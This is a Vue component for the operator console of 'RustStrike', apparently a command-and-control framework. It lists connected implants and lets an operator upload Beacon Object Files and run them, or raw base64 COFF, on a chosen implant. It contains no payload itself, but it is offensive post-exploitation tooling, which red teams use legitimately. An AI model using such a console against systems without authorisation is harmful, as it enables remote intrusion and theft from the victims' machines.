<script lang="ts" setup>
import { ref, reactive, onMounted, onUnmounted, nextTick, computed } from 'vue'
import { ListImplants, Hello, RunBofByName, RunBofByB64, DropImplant, ListBofs, UploadBof } from '../wailsjs/go/main/App'
import { EventsOn } from '../wailsjs/runtime/runtime'

interface Implant { id: number; addr: string; since: string }
interface BofEntry { name: string; size: number }
interface CoreEvent { type: string; implant_id: number; data: string }

const implants = ref<Implant[]>([])
const bofs = ref<BofEntry[]>([])
const selectedId = ref<number | null>(null)
// per-implant output log
const logs = reactive<Record<number, string[]>>({})
const status = ref('connecting to core…')

// BOF run form
const runMode = ref<'lib' | 'b64'>('lib')
const selBof = ref<string>('')
const b64Coff = ref('')
// Args can come from typed text (encoded to base64) OR a raw binary file
// (read verbatim -> base64). Real BOFs (nbtscan, LDAP, …) need the binary CS
// packed format, which can't be typed — use the file source for those.
const argsSrc = ref<'none' | 'text' | 'file'>('none')
const argsText = ref('')
const argsFileB64 = ref('')
const argsFileName = ref('')

const selected = computed(() => implants.value.find(i => i.id === selectedId.value) || null)

async function refresh() {
  try {
    implants.value = await ListImplants()
    bofs.value = await ListBofs()
    status.value = `core ok · ${implants.value.length} implant(s) · ${bofs.value.length} BOF(s)`
    if (selectedId.value === null && implants.value.length) select(implants.value[0].id)
  } catch (e: any) {
    status.value = 'core unreachable: ' + (e?.message || e)
  }
}

function select(id: number) {
  selectedId.value = id
  if (!logs[id]) logs[id] = []
}

function appendLog(id: number, line: string) {
  if (!logs[id]) logs[id] = []
  logs[id].push(line)
  if (logs[id].length > 2000) logs[id].splice(0, logs[id].length - 2000)
  if (id === selectedId.value) nextTick(scrollEnd)
}

function scrollEnd() {
  const el = document.getElementById('output')
  if (el) el.scrollTop = el.scrollHeight
}

async function doHello() {
  if (selectedId.value === null) return
  try { await Hello(selectedId.value) } catch (e: any) { appendLog(selectedId.value, '[err] ' + (e?.message||e)) }
}

async function doDrop() {
  if (selectedId.value === null) return
  try { await DropImplant(selectedId.value); await refresh() } catch (e: any) { appendLog(selectedId.value, '[err] ' + (e?.message||e)) }
}

// Build the base64 args buffer from the chosen source.
function argsB64(): string {
  if (argsSrc.value === 'text' && argsText.value) {
    return btoa(unescape(encodeURIComponent(argsText.value)))
  }
  if (argsSrc.value === 'file' && argsFileB64.value) {
    return argsFileB64.value
  }
  return ''
}
function argsDesc(): string {
  if (argsSrc.value === 'text') return argsText.value || '<none>'
  if (argsSrc.value === 'file') return argsFileName.value || '<none>'
  return '<none>'
}

// Pick a binary args file (.bin) and read it verbatim into base64.
function pickArgsFile() {
  const input = document.createElement('input')
  input.type = 'file'
  input.onchange = async () => {
    const f = input.files?.[0]
    if (!f) return
    const buf = await f.arrayBuffer()
    argsFileB64.value = btoa(String.fromCharCode(...new Uint8Array(buf)))
    argsFileName.value = f.name
    argsSrc.value = 'file'
  }
  input.click()
}

async function doRun() {
  if (selectedId.value === null) return
  const id = selectedId.value
  try {
    if (runMode.value === 'lib') {
      if (!selBof.value) { appendLog(id, '[err] pick a BOF'); return }
      appendLog(id, `>> run ${selBof.value} (args=${argsDesc()})`)
      await RunBofByName(id, selBof.value, argsB64())
    } else {
      if (!b64Coff.value) { appendLog(id, '[err] paste base64 COFF'); return }
      appendLog(id, `>> run raw COFF (args=${argsDesc()})`)
      await RunBofByB64(id, b64Coff.value.trim(), argsB64())
    }
  } catch (e: any) {
    appendLog(id, '[err] ' + (e?.message || e))
  }
}

async function doUpload() {
  const name = prompt('BOF name (without .x64.o):')
  if (!name) return
  const input = document.createElement('input')
  input.type = 'file'
  input.onchange = async () => {
    const f = input.files?.[0]
    if (!f) return
    const buf = await f.arrayBuffer()
    const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)))
    try { await UploadBof(name, b64); await refresh() }
    catch (e: any) { alert('upload failed: ' + (e?.message||e)) }
  }
  input.click()
}

let poll: number | undefined
onMounted(() => {
  EventsOn('core:event', (ev: CoreEvent) => {
    if (ev.type === 'implant_connected' || ev.type === 'implant_disconnected') {
      refresh()
      if (ev.type === 'implant_disconnected') appendLog(ev.implant_id, '--- disconnected ---')
      else appendLog(ev.implant_id, '--- connected ---')
      return
    }
    const tag = ev.type === 'error' ? '[error] ' : ev.type === 'hello' ? '[hello] ' : ''
    appendLog(ev.implant_id, tag + ev.data)
  })
  refresh()
  poll = window.setInterval(refresh, 4000)
})
onUnmounted(() => { if (poll) clearInterval(poll) })
</script>

<template>
  <header class="topbar">
    <div class="brand">RustStrike</div>
    <div class="status" :class="{ ok: status.startsWith('core ok') }">{{ status }}</div>
    <button @click="refresh">refresh</button>
  </header>

  <div class="main">
    <!-- left: implants + bofs -->
    <aside class="sidebar">
      <div class="panel">
        <div class="panel-h">Implants <span class="count">{{ implants.length }}</span></div>
        <ul class="list">
          <li v-for="i in implants" :key="i.id" :class="{ active: i.id === selectedId }" @click="select(i.id)">
            <span class="dot" />
            <span class="id">#{{ i.id }}</span>
            <span class="addr">{{ i.addr }}</span>
          </li>
          <li v-if="!implants.length" class="empty">no implants</li>
        </ul>
      </div>

      <div class="panel grow">
        <div class="panel-h">BOF Library <button class="tiny" @click="doUpload">+ upload</button></div>
        <ul class="list">
          <li v-for="b in bofs" :key="b.name" :class="{ active: runMode==='lib' && selBof===b.name }"
              @click="runMode='lib'; selBof=b.name">
            <span class="bof-name">{{ b.name }}</span>
            <span class="bof-size">{{ b.size }}B</span>
          </li>
          <li v-if="!bofs.length" class="empty">library empty</li>
        </ul>
      </div>
    </aside>

    <!-- right: selected implant console -->
    <section class="console">
      <div v-if="!selected" class="noselect">Select an implant on the left.</div>
      <template v-else>
        <div class="con-h">
          <div class="con-title">#{{ selected.id }} · {{ selected.addr }}</div>
          <div class="con-actions">
            <button @click="doHello">hello</button>
            <button class="danger" @click="doDrop">drop</button>
          </div>
        </div>

        <div class="runbar">
          <label class="seg">
            <input type="radio" value="lib" v-model="runMode" /> library
          </label>
          <label class="seg">
            <input type="radio" value="b64" v-model="runMode" /> raw b64
          </label>
          <select v-if="runMode==='lib'" v-model="selBof" class="sel">
            <option value="" disabled>— pick BOF —</option>
            <option v-for="b in bofs" :key="b.name" :value="b.name">{{ b.name }}</option>
          </select>
          <input v-else v-model="b64Coff" placeholder="base64 COFF…" class="b64" />

          <span class="args-label">args:</span>
          <select v-model="argsSrc" class="args-sel">
            <option value="none">none</option>
            <option value="text">text</option>
            <option value="file">file (.bin)</option>
          </select>
          <input v-if="argsSrc==='text'" v-model="argsText" placeholder="text args → b64"
                 class="args" />
          <button v-if="argsSrc==='file'" @click="pickArgsFile" class="args-file">
            {{ argsFileName || 'choose .bin…' }}
          </button>

          <button class="primary" @click="doRun">run</button>
        </div>

        <div id="output" class="output">
          <div v-for="(l, idx) in logs[selected.id] || []" :key="idx" class="line"
               :class="{ err: l.startsWith('[error]')||l.startsWith('[err]'), hello: l.startsWith('[hello]') }">{{ l }}</div>
          <div v-if="!(logs[selected.id]||[]).length" class="empty">no output yet</div>
        </div>
      </template>
    </section>
  </div>
</template>

<style scoped>
.topbar { display: flex; align-items: center; gap: 14px; padding: 8px 14px; background: var(--panel); border-bottom: 1px solid var(--border); }
.brand { font-weight: 700; font-size: 15px; letter-spacing: .5px; }
.status { flex: 1; color: var(--muted); font-family: var(--mono); font-size: 11px; }
.status.ok { color: var(--green); }
.main { flex: 1; display: flex; min-height: 0; }

.sidebar { width: 280px; display: flex; flex-direction: column; border-right: 1px solid var(--border); background: var(--panel); }
.panel { padding: 10px; border-bottom: 1px solid var(--border); }
.panel.grow { flex: 1; overflow-y: auto; border-bottom: none; }
.panel-h { display: flex; align-items: center; justify-content: space-between; color: var(--muted); text-transform: uppercase; font-size: 11px; letter-spacing: .5px; margin-bottom: 8px; }
.count { background: var(--panel-2); padding: 1px 7px; border-radius: 10px; color: var(--text); }
.tiny { font-size: 10px; padding: 2px 8px; }

.list { list-style: none; margin: 0; padding: 0; }
.list li { display: flex; align-items: center; gap: 8px; padding: 6px 8px; border-radius: 4px; cursor: pointer; font-family: var(--mono); font-size: 12px; }
.list li:hover { background: var(--panel-2); }
.list li.active { background: var(--accent); color: #fff; }
.list li.empty { color: var(--muted); cursor: default; font-style: italic; }
.dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); flex: none; }
.id { color: var(--muted); }
.list li.active .id { color: #cfe0ff; }
.addr { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.bof-name { flex: 1; }
.bof-size { color: var(--muted); font-size: 10px; }

.console { flex: 1; display: flex; flex-direction: column; min-width: 0; }
.noselect { margin: auto; color: var(--muted); }
.con-h { display: flex; align-items: center; justify-content: space-between; padding: 8px 14px; border-bottom: 1px solid var(--border); background: var(--panel); }
.con-title { font-family: var(--mono); font-weight: 600; }
.con-actions { display: flex; gap: 6px; }

.runbar { display: flex; gap: 8px; align-items: center; padding: 8px 14px; border-bottom: 1px solid var(--border); background: var(--panel); flex-wrap: wrap; }
.seg { font-size: 11px; color: var(--muted); display: flex; align-items: center; gap: 3px; }
.sel, .b64, .args, .args-sel { font-size: 12px; }
.sel, .args-sel { background: var(--bg); color: var(--text); border: 1px solid var(--border); border-radius: 4px; padding: 5px; }
.b64 { flex: 1; min-width: 200px; }
.args { width: 220px; }
.args-label { color: var(--muted); font-size: 11px; }
.args-file { font-family: var(--mono); max-width: 200px; overflow: hidden; text-overflow: ellipsis; }

.output { flex: 1; overflow-y: auto; padding: 10px 14px; font-family: var(--mono); font-size: 12px; line-height: 1.5; background: var(--bg); }
.line { white-space: pre-wrap; word-break: break-all; }
.line.err { color: var(--red); }
.line.hello { color: var(--green); }
.output .empty { color: var(--muted); font-style: italic; }
</style>
